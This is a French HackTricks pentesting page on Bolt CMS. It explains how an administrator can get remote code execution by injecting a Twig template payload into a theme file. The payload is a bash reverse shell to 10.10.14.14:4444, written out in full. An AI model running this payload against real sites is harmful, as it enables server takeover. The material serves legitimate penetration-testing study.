# Bolt CMS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## RCE

Après vous être connecté en tant qu'administrateur (allez sur /bot pour accéder à la fenêtre de connexion), vous pouvez obtenir une RCE dans Bolt CMS :

* Sélectionnez `Configuration` -> `View Configuration` -> `Main Configuration` ou allez sur le chemin d'URL `/bolt/file-edit/config?file=/bolt/config.yaml`
  * Vérifiez la valeur du thème

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (3).png" alt=""><figcaption></figcaption></figure>

* Sélectionnez `File management` -> `View & edit templates`
  * Sélectionnez la base de thème trouvée dans l'étape précédente (`base-2021` dans ce cas) et sélectionnez `index.twig`
  * Dans mon cas, cela se trouve sur le chemin d'URL /bolt/file-edit/themes?file=/base-2021/index.twig
* Définissez votre charge utile dans ce fichier via [l'injection de modèle (Twig)](../../pentesting-web/ssti-server-side-template-injection/#twig-php), comme : `{{['bash -c "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1"']|filter('system')}}`
  * Et enregistrez les modifications

<figure><img src="../../.gitbook/assets/image (3) (7).png" alt=""><figcaption></figcaption></figure>

* Effacez le cache dans `Maintenance` -> `Clear the cache`
* Accédez à nouveau à la page en tant qu'utilisateur régulier, et la charge utile devrait être exécutée
